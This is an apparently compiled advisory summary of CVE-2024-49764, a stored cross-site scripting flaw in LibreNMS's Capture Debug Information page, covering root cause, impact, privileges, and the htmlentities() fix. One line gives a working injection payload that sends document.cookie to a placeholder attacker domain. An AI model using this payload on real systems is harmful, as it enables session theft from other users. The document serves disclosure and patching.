# Vulnerability Information: CVE-2024-49764

## Vulnerability Description
LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. A **Stored Cross-Site Scripting** (XSS) vulnerability in the Capture Debug Information page allows authenticated users to inject arbitrary JavaScript through the hostname parameter when creating a new device. This vulnerability results in the execution of malicious code when the Capture Debug Information page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain. This vulnerability is fixed in 24.10.0.

### Vulnerability Description Key Phrases
- **weakness:** **Stored Cross-Site Scripting**
- **impact:** inject arbitrary JavaScript and redirect user to attacker-controlled domain and send non-httponly cookies
- **vector:** hostname parameter
- **attacker:** authenticated users
- **product:** LibreNMS
- **version:** before 24.10.0
- **component:** Capture Debug Information page

## CVE Reference Links Content Summary
Based on the provided content, here's an analysis of CVE-2024-49764:

**Root Cause of Vulnerability:**

- The root cause is insufficient sanitization of the `hostname` parameter when creating a new device in LibreNMS. This unsanitized input is later used in the "Capture Debug Information" page.
- Specifically, the `url` variable, derived from the `hostname` parameter, was not properly sanitized before being included in the HTML of the "Capture Debug Information" page.

**Weaknesses/Vulnerabilities Present:**

- **Stored Cross-Site Scripting (XSS):** The primary weakness is the presence of a stored XSS vulnerability. An attacker can inject malicious JavaScript code through the `hostname` parameter.
- **Insufficient Input Sanitization:** The application fails to sanitize user-provided input (`hostname`) before rendering it in the HTML context.

**Impact of Exploitation:**

- **Arbitrary JavaScript Execution:** An attacker can execute arbitrary JavaScript code in the context of other users' sessions when they visit the "Capture Debug Information" page for a compromised device.
- **User Redirection:** The injected script can redirect the user to a malicious domain.
- **Cookie Theft:** The attacker can capture non-HttpOnly cookies, potentially compromising the user's account and enabling unauthorized actions.

**Attack Vectors:**

- **Network:** The attack vector is network-based, meaning an attacker can exploit this vulnerability remotely over the network.
- **HTTP POST Request:** The attacker injects the malicious payload through a POST request when creating a new device. The specific parameter is the `hostname` field.
- **"Capture Debug Information" Page:** The vulnerability is triggered when a victim navigates to the "Capture Debug Information" page for the device with the injected payload.

**Required Attacker Capabilities/Position:**

- **Authenticated User:** The attacker needs to be an authenticated user to create a device, enabling the malicious hostname injection.
- **Knowledge of Target Application:** The attacker must be aware of the vulnerable parameter and the context where the unsanitized data is rendered (the "Capture Debug Information" page).
- **Ability to Create Devices:** The attacker needs the privilege to create new devices. This is mentioned in the "Privileges required" CVSS base metrics as High.

**Additional Details:**

- **Vulnerable Code Location:** The vulnerability is located in `librenms/includes/html/pages/device/capture.inc.php`.
- **Vulnerable versions:** Affects versions <= 24.9.1
- **Patched versions:** Fixed in version 24.10.0
- **CVSS Score:** The vulnerability has a CVSS v3 base score of 7.5.
- **Payload example:** The following payload can be injected into the hostname parameter when creating a new device `test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"`.
- **Mitigation:** The fix includes using the `htmlentities()` function to properly encode the `hostname` variable before rendering in the HTML. This was implemented in commit `af15eabbb1752985d36f337cecf137a947e170f6`.
- **CWE:** The vulnerability is classified as CWE-79 (Improper Neutralization of Input During Web Page Generation ['Cross-site Scripting']).

In summary, CVE-2024-49764 is a stored XSS vulnerability in LibreNMS that allows authenticated users to inject malicious scripts via the `hostname` parameter when creating a device. This script executes when a user visits the "Capture Debug Information" page of the device, leading to potential user compromise. The vulnerability is due to lack of proper input sanitization and is fixed by encoding the output using `htmlentities()` function.
